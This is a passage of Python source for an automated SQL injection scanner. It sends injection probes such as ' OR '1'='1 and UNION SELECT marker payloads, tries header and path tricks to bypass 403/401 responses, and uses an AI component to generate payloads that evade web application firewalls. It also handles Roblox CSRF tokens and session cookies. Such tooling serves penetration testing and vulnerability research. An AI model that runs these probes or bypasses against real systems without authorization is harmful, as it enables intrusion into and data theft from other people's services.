                self.header_jar = HeaderJar(hdir, cli_headers=cli_headers or {})
                self.header_jar.load()
            except Exception as e:
                log("HeaderJar init failed: {}".format(e), "warn", "SQLI")
                self.header_jar = None

        self.static_headers = {}
        if cookie:
            self.static_headers["Cookie"] = cookie
        if user_agent:
            self.static_headers["User-Agent"] = user_agent

        self._roblox_csrf_cache = {}
        self._roblox_csrf_lock = threading.Lock()

        self.seen_signatures = set()
        self._seen_lock = threading.Lock()
        self._payload_cache = None

        self._throttle_last = {}
        self._throttle_lock = threading.Lock()
        self._host_backoff = {}

        self.host_waf = {}
        self.host_waf_counts = {}
        self.host_rl_counts = {}
        self.host_403_counts = {}
        self.host_bypass_success = {}
        self._waf_lock = threading.Lock()

        self._auth_window = {}
        self._auth_window_size = 20
        self.host_auth_expired = {}
        self._auth_lock = threading.Lock()

        self.ai_dropped = []
        self._ai_dropped_lock = threading.Lock()
        self.brain = None
        if self.use_ai and _BRAIN_AVAILABLE:
            try:
                self.brain = get_brain()
            except Exception as e:
                log("brain init failed: {}".format(e), "warn", "SQLI")
                self.brain = None

    # ------------------------------------------------------------------ #
    #  Roblox CSRF
    # ------------------------------------------------------------------ #
    def _roblox_csrf_for(self, host):
        if not (self.roblox_csrf_enabled and _ROBLOX_CSRF_AVAILABLE):
            return None
        if not _is_roblox_host(host):
            return None
        with self._roblox_csrf_lock:
            cached = self._roblox_csrf_cache.get(host)
            if cached:
                return cached

        session = self._session_headers_base(host)
        try:
            token = get_roblox_csrf_token(session_headers=session,
                                           host=host.split(":")[0])
        except Exception:
            token = None
        if token:
            with self._roblox_csrf_lock:
                self._roblox_csrf_cache[host] = token
        return token

    def _session_headers_base(self, host):
        if self.header_jar is not None:
            return self.header_jar.headers_for(host)
        return dict(self.static_headers)

    def _headers_for(self, url, method="GET"):
        host = urlparse(url).netloc.lower()
        if self.header_jar is not None:
            merged = self.header_jar.headers_for(url)
            merged.update(self.static_headers)
        else:
            merged = dict(self.static_headers)

        if method not in ("GET", "HEAD", "OPTIONS"):
            token = self._roblox_csrf_for(host)
            if token and "x-csrf-token" not in {k.lower() for k in merged}:
                merged["X-CSRF-TOKEN"] = token
        return merged

    # ------------------------------------------------------------------ #
    #  Throttle + backoff + auth window
    # ------------------------------------------------------------------ #
    def _throttle(self, url):
        host = urlparse(url).netloc.lower()

        with self._auth_lock:
            if self.host_auth_expired.get(host):
                return False

        with self._throttle_lock:
            now = time.time()
            backoff_until = self._host_backoff.get(host, 0.0)
            if now < backoff_until:
                wait = backoff_until - now
                if wait > 60:
                    return False
                time.sleep(min(wait, 30))
                now = time.time()

            last = self._throttle_last.get(host, 0.0)
            wait = self.delay - (now - last)
            if wait > 0:
                time.sleep(wait)
                now = time.time()
            self._throttle_last[host] = now
            return True

    def _note_rate_limit(self, host, retry_after):
        with self._throttle_lock:
            wait = max(float(retry_after or 5.0), 5.0)
            self._host_backoff[host] = time.time() + wait
        with self._waf_lock:
            self.host_rl_counts[host] = self.host_rl_counts.get(host, 0) + 1

    def _note_waf_block(self, host, waf_name):
        with self._waf_lock:
            self.host_waf_counts[host] = self.host_waf_counts.get(host, 0) + 1
            if waf_name:
                self.host_waf[host] = waf_name

    def _note_response_status(self, host, status_code):
        with self._auth_lock:
            window = self._auth_window.setdefault(host, [])
            window.append(1 if status_code == 401 else 0)
            if len(window) > self._auth_window_size:
                window.pop(0)
            if (len(window) >= self._auth_window_size and
                    sum(window) / float(len(window)) >= AUTH_EXPIRY_THRESHOLD):
                if not self.host_auth_expired.get(host):
                    self.host_auth_expired[host] = True
                    log("AUTH EXPIRED on {} — {} of last {} responses were 401.".format(
                        host, sum(window), len(window)),
                        "err", "SQLI")

    def _note_403(self, host):
        with self._waf_lock:
            self.host_403_counts[host] = self.host_403_counts.get(host, 0) + 1

    def _note_bypass_success(self, host, headers_used, url_used):
        with self._waf_lock:
            lst = self.host_bypass_success.setdefault(host, [])
            if len(lst) < 10:
                lst.append({"headers": headers_used, "url": url_used})

    # ------------------------------------------------------------------ #
    #  403 / 401 bypass ladder  — FIXED: only 2xx/3xx count
    # ------------------------------------------------------------------ #
    def _try_bypass_ladder(self, ip, base_session_headers):
        if not self.bypass_403_enabled:
            return None

        def _is_success(resp):
            """Only 2xx or 3xx counts. 4xx is not a bypass."""
            if resp is None:
                return False
            return 200 <= resp.status_code < 400

        for attempt in BYPASS_ATTEMPTS:
            merged = dict(base_session_headers)
            merged.update(attempt)
            try:
                r = build_request(ip, ip.value, timeout=self.timeout,
                                  extra_headers=merged)
            except Exception:
                continue
            if _is_success(r):
                host = urlparse(ip.url).netloc.lower()
                self._note_bypass_success(host, attempt, ip.url)
                log("403/401 bypass worked: {} @ {} headers={}".format(
                    r.status_code, ip.url, list(attempt.keys())),
                    "info", "SQLI")
                return r, merged

        for suffix in BYPASS_PATH_SUFFIXES:
            try:
                r = build_request(ip, ip.value, timeout=self.timeout,
                                  extra_headers=base_session_headers,
                                  url_suffix=suffix)
            except Exception:
                continue
            if _is_success(r):
                host = urlparse(ip.url).netloc.lower()
                self._note_bypass_success(host,
                                           {"__path_suffix__": suffix},
                                           ip.url + suffix)
                log("403/401 bypass via path suffix: {} @ {}{}".format(
                    r.status_code, ip.url, suffix), "info", "SQLI")
                return r, base_session_headers

        return None

    # ------------------------------------------------------------------ #
    #  Payload loading
    # ------------------------------------------------------------------ #
    def load_and_filter_payloads(self):
        data = load_payloads("sqli")
        raw = data.get("payloads", [])
        filtered = []
        skipped_destructive = 0
        skipped_dup = 0
        seen_hashes = set()

        for entry in raw:
            if isinstance(entry, str):
                entry = {
                    "id": "raw", "name": "raw", "category": "unknown",
                    "dbms": "generic", "waf": None,
                    "payload": entry, "tags": [], "description": "",
                }

            tags = set(entry.get("tags") or [])
            if not self.allow_destructive and (tags & DESTRUCTIVE_TAGS):
                skipped_destructive += 1
                continue

            entry_waf = entry.get("waf")
            if self.waf_hint and entry_waf:
                if self.waf_hint.lower() not in entry_waf.lower():
                    continue

            entry_dbms = (entry.get("dbms") or "all").lower()
            if self.dbms_hint and entry_dbms not in ("all", "generic"):
                if self.dbms_hint.lower() not in entry_dbms:
                    continue

            pt = entry.get("payload") or ""
            h = _payload_text_hash(pt)
            if h in seen_hashes:
                skipped_dup += 1
                continue
            seen_hashes.add(h)

            filtered.append(entry)

        filtered.sort(key=lambda e: PAYLOAD_PRIORITY.get(
            e.get("category", "unknown"), 99))

        if skipped_destructive:
            log("skipped {} destructive payloads".format(skipped_destructive),
                "info", "SQLI")
        if skipped_dup:
            log("skipped {} duplicate payloads".format(skipped_dup),
                "info", "SQLI")

        self._payload_cache = filtered
        return filtered

    # ------------------------------------------------------------------ #
    #  Smoke test — quick check if IP is worth deep testing
    # ------------------------------------------------------------------ #
    def _smoke_test(self, ip):
        """
        Fire 3 quick probes. Return True if any of them produce a
        fingerprint different from baseline. False if the endpoint is
        inert (skip deep testing).

        The probes are:
          1. random garbage (control for value-shape changes)
          2. single quote
          3. ' OR '1'='1
        """
        session_headers = self._headers_for(ip.url, method=ip.method)
        base_fp = ip.baseline_fp or _fingerprint_response(ip.baseline_resp)

        probes = [
            ("garbage",  "HUGINNsmoke" + secrets.token_hex(3)),
            ("quote",    "'"),
            ("boolean",  "' OR '1'='1"),
        ]

        for label, probe in probes:
            if not self._throttle(ip.url):
                return False
            try:
                r = build_request(ip, probe, timeout=self.timeout,
                                  extra_headers=session_headers)
            except Exception:
                continue
            if r is None:
                continue
            fp = _fingerprint_response(r)
            # Status change = endpoint reacts to input
            if fp.get("status") != base_fp.get("status"):
                return True
            # Content change (small threshold) = endpoint reacts
            if (fp.get("hash") != base_fp.get("hash")
                    and abs(fp["length"] - base_fp["length"]) > 30):
                return True
        return False

    # ------------------------------------------------------------------ #
    #  Baseline capture — with garbage control + optional smoke test
    # ------------------------------------------------------------------ #
    def capture_baseline(self, ip):
        session_headers = self._headers_for(ip.url, method=ip.method)

        fprints = []
        first_status = None
        for _ in range(2):
            if not self._throttle(ip.url):
                ip.stable = False
                return None
            try:
                r = build_request(ip, ip.value, timeout=self.timeout,
                                  extra_headers=session_headers)
            except Exception:
                r = None
            if r is not None and first_status is None:
                first_status = r.status_code
            fprints.append(_fingerprint_response(r))

        # 403/401 — try bypass ladder
        if first_status in (401, 403):
            host = urlparse(ip.url).netloc.lower()
            self._note_403(host)
            bypassed = self._try_bypass_ladder(ip, session_headers)
            if bypassed is not None:
                r_bypass, merged_headers = bypassed
                ip.baseline_resp = r_bypass
                ip.baseline_fp = _fingerprint_response(r_bypass)
                for k, v in merged_headers.items():
                    ip.extra_headers[k] = v
                ip.stable = True
                ip.worth_testing = True   # skip smoke if bypass already succeeded
                return ip.baseline_resp

        # Canonical baseline
        try:
            ip.baseline_resp = build_request(ip, ip.value,
                                              timeout=self.timeout,
                                              extra_headers=session_headers)
        except Exception:
            ip.baseline_resp = None
        ip.baseline_fp = _fingerprint_response(ip.baseline_resp)

        # Stability
        if len(fprints) == 2 and fprints[0]["hash"] and fprints[1]["hash"]:
            if fprints[0]["hash"] != fprints[1]["hash"]:
                if abs(fprints[0]["length"] - fprints[1]["length"]) > 100:
                    ip.stable = False
            if fprints[0]["length"] < 50:
                ip.stable = False
        else:
            ip.stable = False

        # Garbage control — needed for union validation
        if self.smoke_test_enabled:
            garbage = "HUGINNcontrol" + secrets.token_hex(4)
            try:
                if self._throttle(ip.url):
                    ip.control_resp = build_request(
                        ip, garbage, timeout=self.timeout,
                        extra_headers=session_headers)
            except Exception:
                ip.control_resp = None
            ip.control_fp = _fingerprint_response(ip.control_resp)

        # Timing baseline
        samples = []
        for _ in range(3):
            if not self._throttle(ip.url):
                break
            t0 = time.time()
            try:
                build_request(ip, ip.value, timeout=self.timeout,
                              extra_headers=session_headers)
            except Exception:
                pass
            samples.append(time.time() - t0)

        if samples:
            ip.timing_baseline = statistics.median(samples)
            ip.timing_stddev = (statistics.stdev(samples)
                                 if len(samples) > 1 else 0.0)
        else:
            ip.timing_baseline = 0.5
            ip.timing_stddev = 0.2

        # Smoke test — decide if this IP is worth deep testing
        if self.smoke_test_enabled:
            try:
                ip.worth_testing = self._smoke_test(ip)
            except Exception:
                ip.worth_testing = True  # fail open

        return ip.baseline_resp

    # ------------------------------------------------------------------ #
    #  AI WAF augmentation
    # ------------------------------------------------------------------ #
    def _augment_payloads_for_waf(self, host, waf_name, example_url=""):
        if self.brain is None or not self.brain.available():
            return
        with self._waf_lock:
            if self.host_waf.get(host + ":augmented"):
                return
            self.host_waf[host + ":augmented"] = True

        context = {
            "waf": waf_name,
            "url_example": example_url,
            "dbms_hint": self.dbms_hint,
            "notes": "WAF block page detected. Suggest bypass payloads.",
        }
        try:
            payloads = self.brain.suggest_payloads(
                context, kind="sqli", max_payloads=8)
        except Exception as e:
            log("AI payload augmentation failed: {}".format(e),
                "debug", "SQLI")
            return
        if not payloads:
            return

        extra = []
        for i, p in enumerate(payloads):
            extra.append({
                "id": "ai_waf_{}".format(i),
                "name": "AI WAF bypass #{}".format(i + 1),
                "category": "ai_generated",
                "dbms": self.dbms_hint or "all",
                "waf": waf_name,
                "payload": p,
                "tags": ["ai", "waf_bypass", waf_name],
                "description": "AI-generated WAF bypass payload",
            })
        with self._seen_lock:
            if self._payload_cache is not None:
                self._payload_cache = extra + self._payload_cache
        log("AI added {} WAF-bypass payloads ({} on {})".format(
            len(extra), waf_name, host), "info", "SQLI")

    # ------------------------------------------------------------------ #
    #  Detection strategies
    # ------------------------------------------------------------------ #
    def _test_error_based(self, ip, payload_obj, resp, baseline_body):
        try:
            body = resp.text or ""
        except Exception:
            body = ""
        dbms, evidence = _match_error_signature(body, baseline_body)
        if not dbms:
            return None
        return {
            "confidence": "high",
            "subtype": "error_based",
            "reason": "DBMS error signature matched ({})".format(dbms),
            "dbms": dbms,
            "evidence": evidence,
            "verification_method": "error_signature",
        }

    def _test_status_escalation(self, ip, resp):
        if ip.baseline_resp is None:
            return None
        base_status = ip.baseline_resp.status_code
        if base_status < 500 and resp.status_code >= 500:
            try:
                body = resp.text or ""
            except Exception:
                body = ""
            if GENERIC_500_HINTS.search(body):
                return {
                    "confidence": "medium",
                    "subtype": "status_escalation",
                    "reason": "Status escalated {} -> {} with SQL-ish body".format(
                        base_status, resp.status_code),
                    "dbms": None,
                    "evidence": body[:400],
                    "verification_method": "status_escalation",
                }
        return None

    def _test_timing_confirmed(self, ip, payload, first_elapsed):
        if ip.timing_baseline is None:
            return None
        session_headers = self._headers_for(ip.url, method=ip.method)
        threshold = max(
            self.time_threshold,
            ip.timing_baseline + 3.0 * (ip.timing_stddev or 0.2) + 2.0,
        )
        first_delta = first_elapsed - ip.timing_baseline
        if first_delta < threshold - 2.0:
            return None

        if not self.confirm_timing:
            if first_delta >= threshold:
                return {
                    "confidence": "medium",
                    "subtype": "time_based",
                    "reason": "Time delay {:.2f}s (baseline {:.2f}s)".format(
                        first_elapsed, ip.timing_baseline),
                    "dbms": self.dbms_hint,
                    "evidence": "delay=+{:.2f}s".format(first_delta),
                    "verification_method": "timing_unconfirmed",
                }
            return None

        reproductions = 0
        for _ in range(2):
            if not self._throttle(ip.url):
                break
            t0 = time.time()
            try:
                build_request(ip, payload, timeout=self.timeout + 4,
                              extra_headers=session_headers)
            except Exception:
                continue
            elapsed = time.time() - t0
            if (elapsed - ip.timing_baseline) >= threshold - 2.0:
                reproductions += 1
            time.sleep(0.3)

        if reproductions < 2:
            return None

        return {
            "confidence": "high",
            "subtype": "time_based",
            "reason": "Time-based SQLi confirmed — {:.2f}s initial "
                      "({}/2 reproductions)".format(first_elapsed,
                                                     reproductions),
            "dbms": self.dbms_hint,
            "evidence": "baseline={:.2f}s first={:.2f}s reproductions={}/2".format(
                ip.timing_baseline, first_elapsed, reproductions),
            "verification_method": "timing_confirmed",
        }

    def _test_boolean_pair(self, ip, true_payload, false_payload):
        session_headers = self._headers_for(ip.url, method=ip.method)
        try:
            true_resp = build_request(ip, true_payload, timeout=self.timeout,
                                       extra_headers=session_headers)
            if not self._throttle(ip.url):
                return None
            time.sleep(0.1)
            false_resp = build_request(ip, false_payload,
                                        timeout=self.timeout,
                                        extra_headers=session_headers)
        except Exception:
            return None

        if true_resp is None or false_resp is None:
            return None

        true_fp  = _fingerprint_response(true_resp)
        false_fp = _fingerprint_response(false_resp)
        base_fp  = ip.baseline_fp or {"hash": None}
        ctrl_fp  = ip.control_fp or {"hash": None}

        # TRUE and FALSE must differ from each other
        if not _fingerprints_differ(true_fp, false_fp, min_len_delta=100):
            return None
        # And at least one differs from baseline
        t_base = _fingerprints_differ(true_fp, base_fp, min_len_delta=100)
        f_base = _fingerprints_differ(false_fp, base_fp, min_len_delta=100)
        if not (t_base or f_base):
            return None
        # Control: if TRUE matches garbage, it's just reacting to any change
        if ctrl_fp.get("hash"):
            if (true_fp["hash"] == ctrl_fp["hash"]
                    and false_fp["hash"] != ctrl_fp["hash"]):
                # TRUE == garbage, FALSE != garbage → suspicious but not
                # definitive. Only trust if TRUE also matches baseline.
                if true_fp["hash"] == base_fp.get("hash"):
                    return None

        return {
            "confidence": "high",
            "subtype": "boolean_blind",
            "reason": "Boolean-based blind — TRUE and FALSE payloads "
                      "produce different responses",
            "dbms": self.dbms_hint,
            "evidence": "true_len={} false_len={} base_len={} ctrl_len={}".format(
                true_fp["length"], false_fp["length"],
                base_fp.get("length", 0), ctrl_fp.get("length", 0)),
            "verification_method": "boolean_pair",
        }

    def _test_union_marker(self, ip, base_payload, resp):
        """
        Marker-based UNION confirmation.
        ================================
        A UNION payload is only confirmed if a unique random string we
        injected via UNION SELECT appears in the response.

        Preconditions:
          · baseline fingerprint exists
          · garbage control fingerprint exists (built in capture_baseline)
          · garbage != baseline OR garbage == baseline — either is fine,
            but garbage == baseline makes this reliable

        Strategy:
          · Try 3 syntactic contexts: no-quote (numeric), single-quote,
            double-quote
          · For each, try columns 1..8
          · In each attempt, inject a unique marker string in the first
            column and NULL in the rest
          · Confirm ONLY if marker appears in the response body
        """
        baseline_fp = ip.baseline_fp
        if not baseline_fp or not baseline_fp.get("hash"):
            return None

        control_fp = ip.control_fp or {}

        # If garbage response == baseline response, endpoint doesn't react
        # to value changes → union test is unreliable
        if (control_fp.get("hash")
                and control_fp["hash"] == baseline_fp["hash"]):
            # Actually this is GOOD — means the endpoint is stable to
            # value changes, so any response difference from a UNION
            # payload is meaningful. Proceed.
            pass
        # If garbage response ≠ baseline response, endpoint reacts to any
        # value change → union test is unreliable → skip.
        elif (control_fp.get("hash")
                and control_fp["hash"] != baseline_fp["hash"]
                and abs(control_fp.get("length", 0)
                        - baseline_fp.get("length", 0)) > 100):
            log("union skipped: endpoint reacts to garbage on {}:{}".format(
                ip.location, ip.name), "debug", "SQLI")
            return None

        # Strip trailing comment from base payload
        prefix = base_payload
        if "--" in prefix:
            prefix = prefix[:prefix.index("--")].rstrip()

        # Detect if base payload was leading with a quote or not
        # We try 3 contexts to be safe.
        contexts = []
        if prefix.startswith("'"):
            contexts.append(("single_quote", prefix))
        elif prefix.startswith('"'):
            contexts.append(("double_quote", prefix))
        else:
            # numeric context — try both numeric and quoted variants
            contexts.append(("numeric", prefix))
            contexts.append(("single_quote", "' " + prefix))
            contexts.append(("double_quote", '" ' + prefix))

        session_headers = self._headers_for(ip.url, method=ip.method)

        for context_name, pfx in contexts[:2]:   # cap at 2 contexts
            for n in range(1, 9):
                marker = _random_marker()
                cols = ["'{}'".format(marker)] + ["NULL"] * (n - 1)
                probe = "{p} UNION SELECT {c}-- ".format(
                    p=pfx, c=",".join(cols))

                if not self._throttle(ip.url):
                    return None
                try:
                    r = build_request(ip, probe, timeout=self.timeout,
                                      extra_headers=session_headers)
                except Exception:
                    continue
                if r is None:
                    continue

                # THE confirmation: does our unique marker appear?
                try:
                    body = r.text or ""
                except Exception:
                    body = ""

                if marker in body:
                    return {
                        "confidence": "high",
                        "subtype": "union_based",
                        "reason": "UNION SELECT confirmed — injected "
                                  "marker '{}' reflected in response".format(
                                      marker),
                        "dbms": self.dbms_hint,
                        "evidence": "context={} columns={} marker={} "
                                    "baseline_len={} new_len={}".format(
                            context_name, n, marker,
                            baseline_fp.get("length", 0), len(body)),
                        "verification_method": "union_confirmed",
                        "column_count": n,
                        "union_payload": probe,
                        "union_marker": marker,
                        "union_context": context_name,
                    }

        return None

    def _test_body_diff(self, ip, resp):
        if not ip.stable:
            return None
        if not ip.baseline_fp or not ip.baseline_fp.get("hash"):
            return None
        if ip.baseline_resp is None:
            return None

        current = _fingerprint_response(resp)

        # If garbage control already produced a different body, this
        # endpoint reacts to any value change — body_diff is unreliable.
        if ip.control_fp and ip.control_fp.get("hash"):
            if (ip.control_fp["hash"] != ip.baseline_fp["hash"]
                    and abs(ip.control_fp.get("length", 0)
                            - ip.baseline_fp["length"]) > 200):
                return None

        if not _fingerprints_differ(current, ip.baseline_fp, min_len_delta=500):
            return None
        delta = current["length"] - ip.baseline_fp["length"]
        if delta < 500:
            return None
        return {
            "confidence": "low",
            "subtype": "body_diff",
            "reason": "Response body grew by {} bytes".format(delta),
            "dbms": None,
            "evidence": "baseline={} current={}".format(
                ip.baseline_fp["length"], current["length"]),
            "verification_method": "body_diff",
        }

    def _test_reflection(self, ip, resp, payload):
        if not _payload_reflected(resp, payload):
            return None
        return {
            "confidence": "low",
            "subtype": "reflection",
            "reason": "Payload reflected verbatim in response body",
            "dbms": None,
            "evidence": "reflection of '{}'".format(payload[:80]),
            "verification_method": "reflection",
        }

    # ------------------------------------------------------------------ #
    #  Test one payload against one IP
    # ------------------------------------------------------------------ #
    def test_payload(self, ip, payload_obj, baseline_body=""):
        payload = payload_obj["payload"]
        category = (payload_obj.get("category") or "").lower()
        is_time = bool(TIME_PAYLOADS.search(payload))
        is_union = bool(UNION_PAYLOADS.search(payload))
        is_boolean = (category == "blind_boolean" or
                       "boolean" in (payload_obj.get("tags") or []))

        if (self.max_payloads_per_ip and
                ip.payloads_tested >= self.max_payloads_per_ip):
            return None
        if ip.found_high_confidence:
            return None

        if not self._throttle(ip.url):
            return None

        session_headers = self._headers_for(ip.url, method=ip.method)

        start = time.time()
        try:
            resp = build_request(ip, payload, timeout=self.timeout + 4,
                                 extra_headers=session_headers)
        except Exception:
            return None
        elapsed = time.time() - start
        ip.payloads_tested += 1

        if resp is None:
            return None

        host = urlparse(ip.url).netloc.lower()
        self._note_response_status(host, resp.status_code)
        info = classify_status(resp)

        if info["code"] == "RATE_LIMITED":
            self._note_rate_limit(host, info["retry_after"])
            return None

        if info["code"] in ("FORBIDDEN_WAF", "NOT_ACCEPTABLE"):
            self._note_waf_block(host, info["waf_name"])
            if info["waf_name"]:
                self._augment_payloads_for_waf(host, info["waf_name"], ip.url)
            return None

        # Strategy 1: error signature
        hit = self._test_error_based(ip, payload_obj, resp, baseline_body)
        if hit:
            return self._finalize(ip, payload_obj, hit, resp, elapsed, payload)

        # Strategy 2: boolean pair
        if is_boolean:
            opposite = _boolean_opposite(payload)
            if opposite and opposite != payload:
                pair_sig = (_payload_text_hash(payload) + ":" +
                            _payload_text_hash(opposite))
                with self._seen_lock:
                    if pair_sig in self.seen_signatures:
                        opposite = None
                    else:
                        self.seen_signatures.add(pair_sig)
                if opposite:
                    hit = self._test_boolean_pair(ip, payload, opposite)
                    if hit:
                        return self._finalize(ip, payload_obj, hit, resp,
                                              elapsed, payload)

        # Strategy 3: time-based
        if is_time:
            hit = self._test_timing_confirmed(ip, payload, elapsed)
            if hit:
                return self._finalize(ip, payload_obj, hit, resp, elapsed,
                                       payload)

        # Strategy 4: union — marker-based
        if is_union and not is_time:
            hit = self._test_union_marker(ip, payload, resp)
            if hit:
                return self._finalize(ip, payload_obj, hit, resp, elapsed,
                                       payload)

        # Strategy 5: status escalation
        hit = self._test_status_escalation(ip, resp)
        if hit:
            return self._finalize(ip, payload_obj, hit, resp, elapsed, payload)

        # Strategy 6: body diff
        if not is_time and not is_union and resp.status_code < 500:
            hit = self._test_body_diff(ip, resp)
            if hit:
                return self._finalize(ip, payload_obj, hit, resp, elapsed,
                                       payload)

        # Strategy 7: reflection
        if not is_time and not is_union:
            hit = self._test_reflection(ip, resp, payload)
            if hit:
                return self._finalize(ip, payload_obj, hit, resp, elapsed,
                                       payload)

        return None

    def _confirm_medium(self, ip, payload, hit):
        if not self.confirm_medium:
            return hit
        if hit.get("confidence") != "medium":
            return hit

        session_headers = self._headers_for(ip.url, method=ip.method)
        if not self._throttle(ip.url):
            return hit
        try:
            r2 = build_request(ip, payload, timeout=self.timeout + 4,
                                extra_headers=session_headers)
        except Exception:
            return hit
        if r2 is None:
            return hit

        method = hit.get("verification_method")
        if method == "status_escalation":
            if r2.status_code >= 500:
                hit["confidence"] = "high"
                hit["reason"] += " (confirmed on re-fire)"
            else:
                hit["confidence"] = "low"
                hit["reason"] += " (did not reproduce)"
        return hit

    def _finalize(self, ip, payload_obj, hit, resp, elapsed, payload):
        if hit.get("confidence") == "medium":
            hit = self._confirm_medium(ip, payload, hit)
            if hit.get("confidence") == "low":
                log("demoted to low: {}:{}".format(ip.location, ip.name),
                    "debug", "SQLI")

        finding = self._build_finding(ip, payload_obj, hit, resp, elapsed,
                                       payload)
        if finding is None:
            return None

        if hit.get("confidence") == "high":
            ip.found_high_confidence = True
        return finding

    def _passes_severity_filter(self, finding):
        if not self.min_severity:
            return True
        rank = SEVERITY_RANK.get(finding.get("severity", "low"), 1)
        min_rank = SEVERITY_RANK.get(self.min_severity, 0)
        return rank >= min_rank

    def _record_ai_drop(self, finding, verdict, reason="ai_fp"):
        with self._ai_dropped_lock:
            self.ai_dropped.append({
                "reason":         reason,
                "url":            finding.get("url"),
                "parameter":      finding.get("parameter"),
                "location":       finding.get("injection_point", {}).get("location"),
                "payload_id":     finding.get("payload_id"),
                "severity":       finding.get("severity"),
                "verification_method": finding.get("verification_method"),
                "ai_verdict":     verdict,
            })

    def _build_finding(self, ip, payload_obj, hit, resp, elapsed, payload):
        confidence = hit["confidence"]
        severity = _severity_for(confidence)
        session_headers = self._headers_for(ip.url, method=ip.method)

        finding = {
            "type": "sqli",
            "subtype": hit["subtype"],
            "severity": severity,
            "confidence": confidence,
            "confirmed": hit.get("verification_method") in (
                "error_signature", "timing_confirmed",
                "boolean_pair", "union_confirmed",
            ),
            "verification_method": hit.get("verification_method"),

            "url": ip.url,
            "method": ip.method,
            "parameter": ip.name,
            "injection_point": {
                "location": ip.location,
                "name": ip.name,
                "original_value": (ip.value or "")[:200],
                "json_path": ip.json_path,
                "is_header_value": ip.is_header_value,
            },

            "payload_id":          payload_obj.get("id"),
            "payload_name":        payload_obj.get("name"),
            "payload":             payload,
            "payload_category":    payload_obj.get("category"),
            "payload_dbms":        payload_obj.get("dbms"),
            "payload_tags":        payload_obj.get("tags", []),
            "payload_description": payload_obj.get("description", ""),

            "matched_dbms":      hit.get("dbms"),
            "detection_reason":  hit["reason"],
            "evidence":          hit.get("evidence", ""),

            "response_status":   resp.status_code if resp else None,
            "response_length":   len(resp.text or "") if resp else None,
            "response_snippet":  (resp.text or "")[:800],
            "baseline_status":   (ip.baseline_resp.status_code
                                   if ip.baseline_resp else None),
            "baseline_length":   (len(ip.baseline_resp.text or "")
                                   if ip.baseline_resp else None),
            "baseline_timing":   round(ip.timing_baseline or 0, 3),
            "timing_stddev":     round(ip.timing_stddev or 0, 3),
            "elapsed_seconds":   round(elapsed, 3),

            "curl_command": build_curl(ip, payload,
                                        session_headers=session_headers),

            "timestamp": now_iso(),
            "remediation": (
                "Use parameterized queries / prepared statements. Never "
                "concatenate user input into SQL. Apply least-privilege DB "
                "accounts. Validate and whitelist input server-side. "
                "Suppress DBMS error messages in production responses."
            ),
        }

        if hit.get("column_count") is not None:
            finding["union_column_count"] = hit["column_count"]
            finding["union_payload"] = hit.get("union_payload")
            finding["union_marker"] = hit.get("union_marker")
            finding["union_context"] = hit.get("union_context")

        sig = hashlib.md5(
            "{}|{}|{}|{}|{}".format(
                ip.url, ip.name, ip.location,
                _payload_text_hash(payload), confidence
            ).encode()
        ).hexdigest()
        with self._seen_lock:
            if sig in self.seen_signatures:
                return None
            self.seen_signatures.add(sig)

        # AI triage
        if self.brain is not None and self.brain.available():
            try:
                verdict = self.brain.triage(finding, kind="sqli")
                if verdict:
                    finding["ai_triage"] = verdict
                    if (verdict["verdict"] == "FALSE_POSITIVE"
                            and verdict.get("confidence", 0) >= 0.85):
                        self._record_ai_drop(finding, verdict, "ai_fp")
                        log("AI dropped FP: {} (conf {:.2f})".format(
                            ip.name, verdict["confidence"]),
                            "info", "SQLI")
                        return None
            except Exception as e:
                log("AI triage error: {}".format(e), "debug", "SQLI")

        if (self.ai_severity_enabled and self.brain is not None
                and self.brain.available()):
            try:
                sev = self.brain.assess_severity(finding, kind="sqli")
                if sev:
                    finding["ai_severity"] = sev
                    if sev.get("confidence", 0) >= 0.6:
                        finding["severity"] = sev["severity"]
            except Exception as e:
                log("AI severity error: {}".format(e), "debug", "SQLI")

        if not self._passes_severity_filter(finding):
            self._record_ai_drop(finding, None, "low_severity")
            log("Dropped (severity<{}): {} @ {} ({})".format(
                self.min_severity, ip.name, ip.url,
                finding.get("severity", "?")), "info", "SQLI")
            return None

        host = urlparse(ip.url).netloc
        slug = safe_filename(
            (urlparse(ip.url).path or "/").replace("/", "_")
            + "__" + ip.name
            + "__" + ip.location
        )
        fname = "{}__{}_sqli_vulnerable.json".format(
            slug, payload_obj.get("id", "x"))
        out_path = self.findings_root / safe_filename(host) / fname
        try:
            save_json(out_path, finding)
        except Exception as e:
            log("failed to save finding: {}".format(e), "err", "SQLI")
            return None

        sev_color = {
            "critical": "\033[38;5;196m",
            "high":     "\033[38;5;196m",
            "medium":   "\033[38;5;226m",
            "low":      "\033[38;5;240m",
            "info":     "\033[38;5;240m",
        }.get(finding["severity"], "\033[0m")

        ai_tag = ""
        if "ai_triage" in finding:
            ai_tag = " [AI:{}]".format(finding["ai_triage"]["verdict"])

        log("[{}{:8}\033[0m] {}:{} @ {}{} ({} → {})".format(
            sev_color, finding["severity"].upper(),
            ip.location, ip.name, ip.url, ai_tag,
            payload_obj.get("name"), hit["verification_method"]),
            "hit", "SQLI")

        return finding

    # ------------------------------------------------------------------ #
    #  Test one injection point
    # ------------------------------------------------------------------ #
    def test_point(self, ip, payloads):
        host = urlparse(ip.url).netloc.lower()
        with self._auth_lock:
            if self.host_auth_expired.get(host):
                return []

        self.capture_baseline(ip)

        # If smoke test said not worth testing, skip
        if not ip.worth_testing:
            return []

        baseline_body = ((ip.baseline_resp.text or "")
                         if ip.baseline_resp else "")

        # 403/401 with no bypass — skip
        if (ip.baseline_resp is not None and
                ip.baseline_resp.status_code in (401, 403) and
                not ip.extra_headers.get("X-Forwarded-For")):
            return []

        findings = []
        for p in payloads:
            if ip.found_high_confidence:
                break
            if (self.max_payloads_per_ip and
                    ip.payloads_tested >= self.max_payloads_per_ip):
                break
            f = self.test_payload(ip, p, baseline_body)
            if f:
                findings.append(f)
            time.sleep(self.delay)
        return findings

    @staticmethod
    def _spread_points(points):
        by_host = {}
        for ip in points:
            h = urlparse(ip.url).netloc.lower()
            by_host.setdefault(h, []).append(ip)
        out = []
        max_len = max((len(v) for v in by_host.values()), default=0)
        for i in range(max_len):
            for h in by_host:
                if i < len(by_host[h]):
                    out.append(by_host[h][i])
        return out

    # ------------------------------------------------------------------ #
    #  Main entry
    # ------------------------------------------------------------------ #
    def run(self):
        section("SQLi SCANNER :: INITIALISING")

        if self.no_auth:
            log("auth: OFF (--no-auth)", "warn", "SQLI")
        elif self.header_jar is not None:
            profiles = self.header_jar.profiles_loaded()
            if profiles:
                log("auth: ON ({} profiles)".format(len(profiles)),
                    "info", "SQLI")
                for line in self.header_jar.describe().splitlines():
                    log(line, "info", "SQLI")
